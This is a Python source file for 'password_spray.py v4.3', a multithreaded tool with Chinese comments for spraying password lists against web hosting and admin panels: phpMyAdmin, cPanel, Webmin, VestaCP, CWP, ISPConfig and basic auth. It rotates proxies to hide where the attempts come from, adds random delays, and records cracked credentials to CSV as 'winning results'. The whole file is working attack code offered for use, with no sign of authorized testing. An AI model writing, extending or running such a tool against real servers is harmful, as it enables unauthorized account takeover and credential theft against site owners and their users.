#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# password_spray.py v4.3 — 終極穩定版

import sys, os, csv, time, random, requests, argparse, logging, threading, json
from datetime import datetime, timedelta
from urllib.parse import urlparse
from tqdm import tqdm
from queue import Queue

# ====================== 插件匯入 ======================
from password_spray_plugin import (
    phpmyadmin_plugin, cpanel_plugin, basic_auth_plugin,
    webmin_plugin, vestacp_plugin, ispconfig_plugin, cwp_plugin
)

# ====================== 進度 Scheduler ======================
class ProgressScheduler:
    def __init__(self, interval_seconds, progress_file):
        self.interval = interval_seconds
        self.progress_file = progress_file
        self._stop_event = threading.Event()
        self.lock = threading.Lock()
        self.progress_data = {
            "start_time": datetime.now().isoformat(),
            "processed": 0,
            "success": 0,
            "fail": 0,
            "total": 0,
            "percent": 0.0,
            "last_update": ""
        }

    def save(self):
        with self.lock:
            with open(self.progress_file, "w", encoding="utf-8") as f:
                json.dump(self.progress_data, f, indent=4, ensure_ascii=False)

    def increment(self, key, value=1):
        with self.lock:
            self.progress_data[key] += value
            if self.progress_data["total"] > 0:
                self.progress_data["percent"] = round(
                    (self.progress_data["processed"] / self.progress_data["total"]) * 100, 2
                )
            self.save()

    def start(self):
        def run():
            while not self._stop_event.is_set():
                with self.lock:
                    self.progress_data["last_update"] = datetime.now().isoformat()
                    with open(self.progress_file, "w", encoding="utf-8") as f:
                        json.dump(self.progress_data, f, indent=4, ensure_ascii=False)
                time.sleep(self.interval)
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()

    def stop(self):
        self._stop_event.set()
        self.thread.join()

# ====================== 工具函式 ======================
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
csv_lock = threading.Lock()

def clean_old_logs(days=7):
    cutoff = datetime.now() - timedelta(days=days)
    for f in os.listdir(LOG_DIR):
        path = os.path.join(LOG_DIR, f)
        if os.path.isfile(path) and datetime.fromtimestamp(os.path.getmtime(path)) < cutoff:
            os.remove(path)

def test_proxy(proxy):
    if not proxy: return True
    try:
        r = requests.get("https://api.ipify.org", proxies={"http":proxy,"https":proxy}, timeout=6)
        return r.status_code == 200
    except:
        return False

def read_failed_log(file_path, default_port=80):
    if not os.path.exists(file_path): return []
    entries = []
    with open(file_path, encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            target = row.get("Target","").strip()
            user   = row.get("Username","").strip()
            pwd    = row.get("Password","").strip()
            if not (target and user and pwd): continue
            if not target.lower().startswith(("http://","https://")):
                target = "http://" + target
            p = urlparse(target)
            port = p.port or (443 if p.scheme=="https" else default_port)
            clean_url = f"{p.scheme}://{p.hostname}"
            entries.append((clean_url, port, user, pwd))
    return entries

def check_output_files(args):
    """檢查 output 及 failed_log 是否可寫入，並自動建立資料夾"""
    def ensure_path(path):
        if not path: return
        folder = os.path.dirname(path)
        if folder and not os.path.exists(folder):
            try:
                os.makedirs(folder, exist_ok=True)
                logging.info(f"建立資料夾: {folder}")
            except Exception as e:
                logging.error(f"無法建立資料夾 {folder}: {e}")
                sys.exit(1)
        try:
            with open(path, "a"):
                pass
        except Exception as e:
            logging.error(f"無法寫入檔案 {path}: {e}")
            sys.exit(1)
    ensure_path(args.output)
    if hasattr(args, "failed_log") and args.failed_log:
        ensure_path(args.failed_log)
    logging.info("output、failed_log 檔案皆可寫入。")

# ====================== 登入處理 ======================
def process_login(plugin, target, port, username, password, output_file, failed_log, timeout):
    global progress
    try:
        success, code = False, "N/A"
        if args.plugin == "basic_auth":
            success, code, _ = plugin.attempt_basic_auth(
                f"http://{target}:{port}" if not target.startswith("http") else target,
                username, password
            )
        else:
            success, code, _ = plugin.process_login(
                target, port, username, password,
                output_file, failed_log, timeout, 1
            )

        # 更新進度
        progress.increment("processed")
        if success:
            progress.increment("success")
        else:
            progress.increment("fail")

        # CSV 寫入加鎖
        with csv_lock:
            with open(output_file, "a", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                if f.tell() == 0:
                    w.writerow(["Target","Port","Username","Password","Code","Time"])
                if success:
                    w.writerow([target, port, username, password, code, datetime.now().strftime("%H:%M:%S")])

        # Log
        if success:
            logging.info(f"SUCCESS → {target}:{port} | {username}:{password} | Code:{code}")
        elif args.debug:
            logging.debug(f"failed → {target}:{port} | {username}:{password}")

        return success
    except Exception as e:
        if args.debug:
            logging.debug(f"error → {target} | {e}")
        return False

# ====================== Worker ======================
def worker(task_queue, plugin, proxy_pool, single_proxy):
    proxy_ip_cache = {}
    while True:
        try:
            target, port, username, password = task_queue.get(timeout=3)
        except:
            break
        # 延遲
        if args.max_delay > args.min_delay:
            time.sleep(random.uniform(args.min_delay, args.max_delay))
        # 選擇 proxy
        proxy = random.choice(proxy_pool) if proxy_pool else single_proxy
        if proxy and proxy not in proxy_ip_cache:
            try:
                ip = requests.get("https://api.ipify.org", proxies={"http":proxy,"https":proxy}, timeout=3).text.strip()
                proxy_ip_cache[proxy] = ip
            except:
                proxy_ip_cache[proxy] = "ERR"
        # 登入
        process_login(plugin, target, port, username, password, args.output, args.failed_log or "", args.timeout)
        pbar.update(1)
        task_queue.task_done()

# ====================== 主程式 ======================
def main():
    global args, pbar, progress
    parser = argparse.ArgumentParser(description="Password Spray v4.3 終極穩定版 (Queue 模式)")
    parser.add_argument("--target_list", required=False)
    parser.add_argument("--username")
    parser.add_argument("--username_list")
    parser.add_argument("--password_list", required=False)
    parser.add_argument("--plugin", required=True, choices=["basic_auth","phpmyadmin","cpanel","webmin","vestacp","cwp","ispconfig"])
    parser.add_argument("--output", required=True)
    parser.add_argument("--failed_log")
    parser.add_argument("--retry_failed")
    parser.add_argument("--threads", type=int, default=100)
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--min_delay", type=float, default=0.0)
    parser.add_argument("--max_delay", type=float, default=0.0)
    parser.add_argument("--proxy")
    parser.add_argument("--proxy_pool")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    # 檢查 output 與 failed_log
    check_output_files(args)

    # 日誌設定
    log_file = os.path.join(LOG_DIR, f"{args.plugin}_{datetime.now():%Y%m%d_%H%M%S}.log")
    logging.getLogger().handlers.clear()
    logging.getLogger().setLevel(logging.DEBUG if args.debug else logging.INFO)
    console = logging.StreamHandler(sys.stderr)
    console.setLevel(logging.WARNING)
    console.setFormatter(logging.Formatter("%(asctime)s | %(message)s", "%H:%M:%S"))
    logging.getLogger().addHandler(console)
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setFormatter(logging.Formatter("%(asctime)s | %(message)s", "%H:%M:%S"))
    logging.getLogger().addHandler(fh)
    logging.info("Password Spray v4.3 啟動")
    clean_old_logs(days=7)

    # ==================== 代理 ====================
    pool = []
    if args.proxy_pool and os.path.isfile(args.proxy_pool):
        pool = [l.strip() for l in open(args.proxy_pool) if l.strip() and test_proxy(l.strip())]
    single_proxy = args.proxy if args.proxy and test_proxy(args.proxy) else None

    # ==================== 讀取目標 ====================
    if args.retry_failed:
        entries = read_failed_log(args.retry_failed, args.port)
        targets   = list({e[0] for e in entries})
        usernames = list({e[2] for e in entries})
        passwords = list({e[3] for e in entries})
    else:
        if not args.target_list or not args.password_list:
            parser.error("必須提供 --target_list 和 --password_list")
        targets   = [l.strip() for l in open(args.target_list) if l.strip()]
        passwords = [l.strip() for l in open(args.password_list) if l.strip()]
        if args.username_list:
            usernames = [l.strip() for l in open(args.username_list) if l.strip()]
        elif args.username:
            usernames = [args.username]
        else:
            parser.error("請提供 --username 或 --username_list")

    # ==================== 初始化進度 ====================
    total_tasks = len(targets) * len(usernames) * len(passwords)
    progress = ProgressScheduler(interval_seconds=1, progress_file="progress.json")
    progress.progress_data["total"] = total_tasks
    progress.start()
    logging.info(f"總嘗試次數 → {total_tasks:,}")

    # ==================== 插件初始化 ====================
    if args.plugin == "phpmyadmin":
        plugin = phpmyadmin_plugin.PhpMyAdminPlugin(
            threads=args.threads,
            timeout=args.timeout,
            debug=args.debug,
            proxy=single_proxy
        )
    else:
        plugin_map = {
            "basic_auth": basic_auth_plugin.BasicAuthPlugin,
            "cpanel": cpanel_plugin.CPanelBruteForcePlugin,
            "webmin": webmin_plugin.WebminBruteForcePlugin,
            "vestacp": vestacp_plugin.VestaCPBruteForcePlugin,
            "cwp": cwp_plugin.CWPBruteForcePlugin,
            "ispconfig": ispconfig_plugin.ISPConfigBruteForcePlugin,
        }
        plugin = plugin_map[args.plugin](
            threads=args.threads,
            timeout=args.timeout,
            debug=args.debug,
            proxy=single_proxy,
            proxy_pool=pool
        )

    # ==================== TQDM 進度條 ====================
    global pbar
    pbar = tqdm(total=total_tasks, desc="Spray", unit="try", colour="cyan",
                mininterval=0.5, dynamic_ncols=True, file=sys.stdout, leave=True,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining} | {rate_fmt}]")

    # ==================== 建立任務 Queue ====================
    task_queue = Queue()
    for target in targets:
        for user in usernames:
            for pwd in passwords:
                task_queue.put((target, args.port, user, pwd))

    # ==================== 啟動 Worker ====================
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(task_queue, plugin, pool, single_proxy))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    pbar.close()
    progress.stop()
    logging.info("🚀 任務全部完成")
    logging.info(f"中獎結果已儲存至 → {args.output}")
    logging.info(f"完整日誌 → {log_file}")
    logging.info(f"即時監控指令：tail -f {log_file} | grep --color=always -E 'PROGRESS|SUCCESS|$'")

if __name__ == "__main__":
    main()



